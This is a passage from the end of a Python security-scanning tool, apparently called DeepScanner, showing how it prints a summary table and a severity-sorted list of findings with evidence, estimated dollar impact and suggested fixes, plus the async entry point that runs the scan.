            console.print(f"  [yellow]! Batch queries allowed (potential DoS)[/yellow]")

    def _report(self):
        """Generate final report."""
        console.print(f"\n{'='*70}")
        console.print(f"[bold]DEEP SCAN COMPLETE[/bold]")
        console.print(f"{'='*70}\n")

        # Statistics
        t = Table(box=box.ROUNDED, title="Scan Summary")
        t.add_column("Metric", style="cyan")
        t.add_column("Value")

        t.add_row("Total Requests", str(self.request_count))
        t.add_row("Endpoints Found", str(len(self.discovered_endpoints)))
        t.add_row("IDs Discovered", str(len(self.discovered_ids)))
        t.add_row("Total Findings", str(len(self.findings)))

        crit = len([f for f in self.findings if f.severity == "CRITICAL"])
        high = len([f for f in self.findings if f.severity == "HIGH"])
        med = len([f for f in self.findings if f.severity == "MEDIUM"])

        t.add_row("Critical", f"[red]{crit}[/red]")
        t.add_row("High", f"[yellow]{high}[/yellow]")
        t.add_row("Medium", f"[blue]{med}[/blue]")

        total_impact = sum(f.impact for f in self.findings)
        t.add_row("Total Impact", f"[bold]${total_impact:,}[/bold]")

        console.print(t)

        # Findings
        if self.findings:
            console.print(f"\n[bold]FINDINGS:[/bold]")

            sorted_findings = sorted(self.findings,
                key=lambda x: {"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1}.get(x.severity, 0),
                reverse=True
            )

            for i, f in enumerate(sorted_findings, 1):
                color = {"CRITICAL": "red bold", "HIGH": "yellow", "MEDIUM": "blue"}.get(f.severity, "dim")
                console.print(f"\n  {i}. [{color}][{f.severity}][/{color}] {f.title}")
                console.print(f"     Category: {f.category}")
                console.print(f"     Endpoint: {f.endpoint}")
                if f.parameter:
                    console.print(f"     Parameter: {f.parameter}")
                console.print(f"     {f.description}")
                if f.evidence:
                    console.print(f"     [dim]Evidence: {f.evidence[:80]}...[/dim]")
                if f.impact:
                    console.print(f"     [green]Impact: ${f.impact:,}[/green]")
                if f.fix:
                    console.print(f"     [cyan]Fix: {f.fix}[/cyan]")
        else:
            console.print(f"\n[green]No vulnerabilities found! The application appears secure.[/green]")

        console.print(f"\n{'='*70}\n")


async def main():
    async with DeepScanner(TARGET, SESSION_TOKEN) as scanner:
        await scanner.run()


if __name__ == "__main__":
    asyncio.run(main())
